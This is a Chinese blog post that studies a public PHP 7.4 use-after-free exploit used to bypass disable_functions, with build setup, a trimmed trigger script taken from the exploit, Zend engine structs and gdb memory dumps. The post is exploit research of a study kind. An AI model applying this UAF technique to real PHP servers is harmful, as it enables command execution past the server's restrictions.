

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/css/images/bg/favicon.ico">
  <link rel="icon" href="/css/images/bg/favicon.ico">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Aluvion">
  <meta name="keywords" content="">
  
    <meta name="description" content="前言没什么，想学就学了。 exp：https:&#x2F;&#x2F;github.com&#x2F;mm0r1&#x2F;exploits&#x2F;blob&#x2F;master&#x2F;php7-backtrace-bypass&#x2F;exploit.php">
<meta property="og:type" content="article">
<meta property="og:title" content="PHP-UAF漏洞初探">
<meta property="og:url" content="http://yoursite.com/2020/03/26/PHP-UAF%E6%BC%8F%E6%B4%9E%E5%88%9D%E6%8E%A2/index.html">
<meta property="og:site_name" content="Twings">
<meta property="og:description" content="前言没什么，想学就学了。 exp：https:&#x2F;&#x2F;github.com&#x2F;mm0r1&#x2F;exploits&#x2F;blob&#x2F;master&#x2F;php7-backtrace-bypass&#x2F;exploit.php">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://yoursite.com/css/images/uaf/2020032501.png">
<meta property="og:image" content="http://yoursite.com/css/images/uaf/2020032502.png">
<meta property="og:image" content="http://yoursite.com/css/images/uaf/2020032503.png">
<meta property="og:image" content="http://yoursite.com/css/images/uaf/2020032504.png">
<meta property="og:image" content="http://yoursite.com/css/images/uaf/2020032505.png">
<meta property="og:image" content="http://yoursite.com/css/images/uaf/2020032506.png">
<meta property="og:image" content="http://yoursite.com/css/images/uaf/2020032507.png">
<meta property="og:image" content="http://yoursite.com/css/images/uaf/2020032508.png">
<meta property="og:image" content="http://yoursite.com/css/images/uaf/2020032509.png">
<meta property="og:image" content="http://yoursite.com/css/images/uaf/2020032510.png">
<meta property="og:image" content="http://yoursite.com/css/images/uaf/2020032511.png">
<meta property="og:image" content="http://yoursite.com/css/images/uaf/2020032512.png">
<meta property="og:image" content="http://yoursite.com/css/images/uaf/2020032513.png">
<meta property="article:published_time" content="2020-03-26T15:30:00.000Z">
<meta property="article:modified_time" content="2022-04-15T13:47:21.011Z">
<meta property="article:author" content="Aluvion">
<meta property="article:tag" content="Web">
<meta property="article:tag" content="Pwn">
<meta property="article:tag" content="PHP">
<meta property="article:tag" content="PHPUAF">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://yoursite.com/css/images/uaf/2020032501.png">
  
  
  
  <title>PHP-UAF漏洞初探 - Twings</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"yoursite.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Fluid</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/css/images/bg/bg5.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="PHP-UAF漏洞初探"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2020-03-26 23:30" pubdate>
          2020年3月26日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          3.1k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          26 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">PHP-UAF漏洞初探</h1>
            
            
              <div class="markdown-body">
                
                <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>没什么，想学就学了。</p>
<p>exp：<a href="https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php">https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php</a></p>
<span id="more"></span>

<hr>
<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>gdb 调试的是 C 层面的代码，而调试 php 又不好看到内存的变化，头疼。看到一个好像调试 cli 模式的 phpdbg，现在用不着，以后再试试。</p>
<p>先开一个 docker 吧：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -id --privileged --name php -p 8080:80 php:7.4.2-apache</span><br></pre></td></tr></table></figure>

<p>修改 &#x2F;etc&#x2F;apache2&#x2F;mods-available&#x2F;mpm_prefork.conf，减少进程数量：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IfModule</span> <span class="attr">mpm_prefork_module</span>&gt;</span></span><br><span class="line">	StartServers			 1</span><br><span class="line">	MinSpareServers		  0</span><br><span class="line">	MaxSpareServers		 1</span><br><span class="line">	MaxRequestWorkers	  1</span><br><span class="line">	MaxConnectionsPerChild   0</span><br><span class="line"><span class="tag">&lt;/<span class="name">IfModule</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这次打算调试一下 apache mod_php，需要重新安装 php，生成可以调试的 libphp.so，所以先安装 apache2-dev（有的源可能装不了，我用的是 debian10 的阿里云源），再重新编译安装 php：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure --enable-phpdbg-debug --enable-debug --with-apxs2=/usr/bin/apxs2 CFLAGS=&quot;-g3 -gdwarf-4&quot;</span><br></pre></td></tr></table></figure>

<p>记得 make 和 make install，然后我们就能看到 &#x2F;usr&#x2F;lib&#x2F;apache2&#x2F;modules 下面的 libphp.so 更新了。</p>
<p>结果发现 exp 打不通了，一脸懵。没办法，看看它原本的编译方式再来一遍吧。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure --build=x86_64-linux-gnu --with-config-file-path=/usr/local/etc/php --with-config-file-scan-dir=/usr/local/etc/php/conf.d --enable-option-checking=fatal --with-mhash --enable-ftp --enable-mbstring --enable-mysqlnd --with-password-argon2 --with-sodium=shared --with-pdo-sqlite=/usr --with-sqlite3=/usr --with-curl --with-libedit --with-openssl --with-zlib --with-pear --with-libdir=lib/x86_64-linux-gnu --with-apxs2 --disable-cgi build_alias=x86_64-linux-gnu --enable-debug CFLAGS=&quot;-g3 -gdwarf-4&quot; --enable-phpdbg-debug</span><br></pre></td></tr></table></figure>

<p>还是打不通 -_- ，看来开了 debug 会导致一些内存上的差异。</p>
<p>再试试 php-fpm，官方镜像打不通，我还是自己动手调试一下吧。</p>
<hr>
<h3 id="本地-PHP-Cli-调试"><a href="#本地-PHP-Cli-调试" class="headerlink" title="本地  PHP - Cli  调试"></a>本地  PHP - Cli  调试</h3><p>本地自己编译安装一个 php7.4.2 的 cli，只加了 –prefix 参数，可以读取到符号表，exp 也能打通。初次调试，我也不知道怎么调试比较好，只能一步步来了。先从 exp 修改一个 UAF 的测试脚本，用来看看这些变量的地址关系：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">pwn</span>(<span class="string">&quot;id&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>;</span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>(); <span class="comment"># ;)</span></span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123; <span class="comment"># PHP &gt;= 7.4</span></span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment"># str_shuffle prevents opcache string interning</span></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;T&#x27;</span>, <span class="number">79</span>);</span><br><span class="line">	    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$arg</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$vuln</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$abc</span>);</span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$helper</span>);</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$helper</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>给 php_var_dump 下断点，我们就能在内存中追踪这些变量了。运行编译好的 sapi 下的 php-cli 程序，我们首先可以看到内存中的 $arg 变量的数据是这样一个结构体：</p>
<p><img src="/css/images/uaf/2020032501.png" srcset="/img/loading.gif" lazyload></p>
<p>在源码则是这样定义的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span> _<span class="title">zend_value</span> &#123;</span></span><br><span class="line">	zend_long         lval;				<span class="comment">/* long value */</span></span><br><span class="line">	<span class="type">double</span>            dval;				<span class="comment">/* double value */</span></span><br><span class="line">	zend_refcounted  *counted;</span><br><span class="line">	zend_string      *str;</span><br><span class="line">	zend_array       *arr;</span><br><span class="line">	zend_object      *obj;</span><br><span class="line">	zend_resource    *res;</span><br><span class="line">	zend_reference   *ref;</span><br><span class="line">	zend_ast_ref     *ast;</span><br><span class="line">	zval             *zv;</span><br><span class="line">	<span class="type">void</span>             *ptr;</span><br><span class="line">	zend_class_entry *ce;</span><br><span class="line">	zend_function    *func;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">		<span class="type">uint32_t</span> w1;</span><br><span class="line">		<span class="type">uint32_t</span> w2;</span><br><span class="line">	&#125; ww;</span><br><span class="line">&#125; zend_value;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zval_struct</span> &#123;</span></span><br><span class="line">	zend_value        value;			<span class="comment">/* value */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			ZEND_ENDIAN_LOHI_3(</span><br><span class="line">				zend_uchar    type,			<span class="comment">/* active type */</span></span><br><span class="line">				zend_uchar    type_flags,</span><br><span class="line">				<span class="keyword">union</span> &#123;</span><br><span class="line">					<span class="type">uint16_t</span>  extra;        <span class="comment">/* not further specified */</span></span><br><span class="line">				&#125; u)</span><br><span class="line">		&#125; v;</span><br><span class="line">		<span class="type">uint32_t</span> type_info;</span><br><span class="line">	&#125; u1;</span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="type">uint32_t</span>     next;                 <span class="comment">/* hash collision chain */</span></span><br><span class="line">		<span class="type">uint32_t</span>     cache_slot;           <span class="comment">/* cache slot (for RECV_INIT) */</span></span><br><span class="line">		<span class="type">uint32_t</span>     opline_num;           <span class="comment">/* opline number (for FAST_CALL) */</span></span><br><span class="line">		<span class="type">uint32_t</span>     lineno;               <span class="comment">/* line number (for ast nodes) */</span></span><br><span class="line">		<span class="type">uint32_t</span>     num_args;             <span class="comment">/* arguments number for EX(This) */</span></span><br><span class="line">		<span class="type">uint32_t</span>     fe_pos;               <span class="comment">/* foreach position */</span></span><br><span class="line">		<span class="type">uint32_t</span>     fe_iter_idx;          <span class="comment">/* foreach iterator index */</span></span><br><span class="line">		<span class="type">uint32_t</span>     access_flags;         <span class="comment">/* class constant access flags */</span></span><br><span class="line">		<span class="type">uint32_t</span>     property_guard;       <span class="comment">/* single property guard */</span></span><br><span class="line">		<span class="type">uint32_t</span>     constant_flags;       <span class="comment">/* constant flags */</span></span><br><span class="line">		<span class="type">uint32_t</span>     extra;                <span class="comment">/* not further specified */</span></span><br><span class="line">	&#125; u2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>u2 都是 0，暂且不管；u1 是类型相关的数据，6 代表这是个字符串；value 则是变量值，我们可以看到 string 变量 value 中的每种类型基本都表示同一个地址，也就是说各种变量在底层都是不分家的，只靠 type 来将地址处的数据处理成相应的结构体。换句话说两个不同类型的变量指向同一个地址，就会因为类型不同而取出不同的数据。</p>
<p>$arg 是 string，在底层是一个 zend_string 类型，由类型、长度和值等组成：</p>
<p><img src="/css/images/uaf/2020032502.png" srcset="/img/loading.gif" lazyload></p>
<p>在源码中则是这样的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_string</span> &#123;</span></span><br><span class="line">	zend_refcounted_h gc;</span><br><span class="line">	zend_ulong        h;                <span class="comment">/* hash value */</span></span><br><span class="line">	<span class="type">size_t</span>            len;</span><br><span class="line">	<span class="type">char</span>              val[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>有趣的一点是，php 的 strlen 函数获取的实际上就是这里的 len：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ZEND_FUNCTION(<span class="built_in">strlen</span>)</span><br><span class="line">&#123;</span><br><span class="line">	zend_string *s;</span><br><span class="line"></span><br><span class="line">	ZEND_PARSE_PARAMETERS_START(<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">		Z_PARAM_STR(s)</span><br><span class="line">	ZEND_PARSE_PARAMETERS_END();</span><br><span class="line"></span><br><span class="line">	RETVAL_LONG(ZSTR_LEN(s));</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ZSTR_LEN(zstr)  (zstr)-&gt;len</span></span><br></pre></td></tr></table></figure>

<p>而访问字符串则是访问这里的 val 部分，unset 一个字符串则会把前面的 gc 和 h 部分修改，后面的 len 和 val 不会修改，这里我 unset 了一个 66 长度的字符串（Twings * 11）做测试：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;Twings&quot;</span>, <span class="number">11</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$s</span>);</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$s</span>);</span><br><span class="line"><span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>();</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$helper</span>);</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x7ffff3e7f070</span></span><br><span class="line"><span class="number">0x7ffff3e7f070</span>:	<span class="number">0x00007ffff3e7f0e0</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff3e7f080</span>:	<span class="number">0x0000000000000042</span>	<span class="number">0x775473676e697754</span></span><br><span class="line"><span class="number">0x7ffff3e7f090</span>:	<span class="number">0x6e69775473676e69</span>	<span class="number">0x73676e6977547367</span></span><br><span class="line"><span class="number">0x7ffff3e7f0a0</span>:	<span class="number">0x775473676e697754</span>	<span class="number">0x6e69775473676e69</span></span><br><span class="line"><span class="number">0x7ffff3e7f0b0</span>:	<span class="number">0x73676e6977547367</span>	<span class="number">0x775473676e697754</span></span><br><span class="line"><span class="number">0x7ffff3e7f0c0</span>:	<span class="number">0x6e69775473676e69</span>	<span class="number">0x0000000000007367</span></span><br><span class="line"><span class="number">0x7ffff3e7f0d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff3e7f0e0</span>:	<span class="number">0x00007ffff3e7f150</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff3e7f0f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff3e7f100</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>

<p>因为长度没有对上，所以新的 helper 对象并没有覆盖 unset 掉的 $s 字符串的空间，会存放在更小的堆里面。</p>
<p>这里有个问题，为什么需要一个函数来调用 Vuln 类，还需要再一步引用待释放变量和利用 Vuln 的构析函数？因为<a href="https://bugs.php.net/bug.php?id=76047">BUG报告</a>说，错误需要引用计数为 2，且与构析函数有关。具体的涉及 PHP 底层，这里不深入研究。</p>
<p>我们继续运行脚本，会发现，$vuln-&gt;a 跟 $abc 的数据指针都指向了 $arg 的地方。再后面，helper 恰好占用了这个被释放的字符串的位置：</p>
<p><img src="/css/images/uaf/2020032503.png" srcset="/img/loading.gif" lazyload></p>
<p>按照源码中的定义：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_object</span> &#123;</span></span><br><span class="line">	zend_refcounted_h gc;</span><br><span class="line">	<span class="type">uint32_t</span>          handle; <span class="comment">// <span class="doctag">TODO:</span> may be removed ???</span></span><br><span class="line">	zend_class_entry *ce;</span><br><span class="line">	<span class="type">const</span> zend_object_handlers *handlers;</span><br><span class="line">	HashTable        *properties;</span><br><span class="line">	zval              properties_table[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>每个成员要占据 0x10 的地址空间，也就是说如果有更多或者更少成员变量，那么这个对象就不会存放在这个能存放长度 79 的字符串的地方。</p>
<p>这里看起来是一个个固定大小的堆，每个堆的开头会有一个指向下一个堆的指针。helper 对象中有 4 个成员变量，而只有一个赋了值，所以其他三个都是 0x0000003000000030 和 0x0000000000000001 组成的未定义数据，而 b 则是一个 zval 类型的数据：</p>
<p><img src="/css/images/uaf/2020032504.png" srcset="/img/loading.gif" lazyload></p>
